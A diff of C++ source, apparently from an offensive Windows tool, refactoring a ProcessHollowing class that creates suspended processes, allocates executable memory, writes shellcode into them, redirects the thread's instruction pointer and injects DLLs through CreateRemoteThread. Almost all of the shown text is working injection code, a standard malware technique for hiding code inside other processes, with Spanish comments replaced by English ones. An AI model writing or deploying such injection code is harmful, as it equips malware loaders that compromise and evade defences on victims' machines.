@@ -57,7 +57,7 @@ PROCESS_INFORMATION ProcessHollowing::_CreateSuspendedProcess(const std::string&
 
 	return pi;
 }
-
+/*
 CONTEXT ProcessHollowing::_GetProcessContext(HANDLE hThread) {
 	CONTEXT ctx;
 	ctx.ContextFlags = CONTEXT_FULL;
@@ -68,23 +68,7 @@ CONTEXT ProcessHollowing::_GetProcessContext(HANDLE hThread) {
 
 	return ctx;
 }
-
-PVOID ProcessHollowing::_WriteShellcodeToProcess(HANDLE hProcess, const std::vector<unsigned char>& shellcode) {
-	LPVOID shellcodeAddress = api.VirtualAllocEx(hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	if (shellcodeAddress == NULL) {
-		std::cerr << "Error asignando memoria: " << GetLastError() << std::endl;
-		throw std::runtime_error("Error asignando memoria");
-	}
-
-	// Usar la llamada indirecta a WriteProcessMemory
-	if (!api.WriteProcessMemory(hProcess, shellcodeAddress, shellcode.data(), shellcode.size(), NULL)) {
-		std::cerr << "Error escribiendo memoria: " << GetLastError() << std::endl;
-		throw std::runtime_error("Error escribiendo memoria");
-	}
-
-	return shellcodeAddress;
-}
-
+*/
 VOID ProcessHollowing::_SetContextAndResumeProcess(HANDLE hProcess, HANDLE hThread, CONTEXT& ctx, PVOID shellcodeAddress) {
 	ctx.Rip = (DWORD64)shellcodeAddress;
 
@@ -107,67 +91,40 @@ void  ProcessHollowing::_ResumeProcess(PROCESS_INFORMATION& pi) {
 	CloseHandle(pi.hThread);
 }
 
-/*
 bool ProcessHollowing::InjectShellcode(const std::string& targetProcess, const std::vector<unsigned char>& shellcode) {
-    try {
-        // 1. Crear el proceso suspendido
-        PROCESS_INFORMATION pi = _CreateSuspendedProcess(targetProcess);
+	PROCESS_INFORMATION pi = _CreateSuspendedProcess(targetProcess);
 
-        // 2. Asignar memoria para el shellcode
-        LPVOID shellcodeAddress = _AllocateRemoteMemory(pi.hProcess, shellcode.size());
-        _WriteRemoteMemory(pi.hProcess, shellcodeAddress, shellcode.data(), shellcode.size());
+	ShellcodeInjector shellcodeInjector;
+	shellcodeInjector.InjectInto(pi, shellcode);
+	if (!shellcodeInjector.GetThreadContext()) {
+		return false;
+	}
 
-        // 3. Obtener y modificar el contexto del hilo
-        CONTEXT ctx = _GetProcessContext(pi.hThread);
-        ctx.Rip = (DWORD64)shellcodeAddress;
+	_ResumeProcess(pi);
 
-        if (!api.SetThreadContext(pi.hThread, &ctx)) {
-            throw std::runtime_error("Error ajustando el contexto del hilo");
-        }
-
-        // 4. Reanudar el proceso
-        _ResumeProcess(pi);
-
-        std::cout << "Shellcode inyectado exitosamente." << std::endl;
-    }
-    catch (const std::exception& e) {
-        std::cerr << "Error en InjectShellcode: " << e.what() << std::endl;
-    }
+	Logger::info("Shellcode successfully injected.");
+	return true;
 }
-*/
+
 bool ProcessHollowing::InjectDLL(const std::string& targetProcess, const std::string& dllPath) {
 	try {
-		// 1. Crear el proceso suspendido
+		// 1. Create suspended process
 		PROCESS_INFORMATION pi = _CreateSuspendedProcess(targetProcess);
 
-		/*
-		// 2. Asignar memoria para la ruta del DLL
-		LPVOID dllPathAddress = _AllocateRemoteMemory(pi.hProcess, dllPath.size() + 1);
-		_WriteRemoteMemory(pi.hProcess, dllPathAddress, dllPath.c_str(), dllPath.size() + 1);
-
-		// 3. Obtener la dirección de LoadLibraryA
-		LPVOID loadLibraryAddr = _GetLoadLibraryAddress();
-
-		// 4. Crear un hilo remoto para ejecutar LoadLibraryA
-		HANDLE hRemoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, dllPathAddress, 0, NULL);
-		if (hRemoteThread == NULL) {
-			throw std::runtime_error("Error creando el hilo remoto");
-		}
-
-
-		*/
-		RemoteThreadDllInjector dllInjector(pi, dllPath);
+		// 2. DLL memory assignment
+		RemoteThreadDllInjector dllInjector;
+		dllInjector.InjectInto(pi, dllPath);
 		HANDLE hRemoteThread = dllInjector.GetHRemoteThread();
 		HANDLE dllPathAddress = dllInjector.GetDllPathAddress();
 
-		// 5. Esperar a que el hilo termine
+		// 3. Waiting for thread finishing
 		WaitForSingleObject(hRemoteThread, INFINITE);
 
-		// 6. Limpiar recursos
+		// 4. Resources cleaning
 		CloseHandle(hRemoteThread);
 		VirtualFreeEx(pi.hProcess, dllPathAddress, 0, MEM_RELEASE);
 
-		// 7. Reanudar el proceso
+		// 5. Process restart
 		_ResumeProcess(pi);
 
 		Logger::info("DLL successfully loaded on target " + targetProcess);
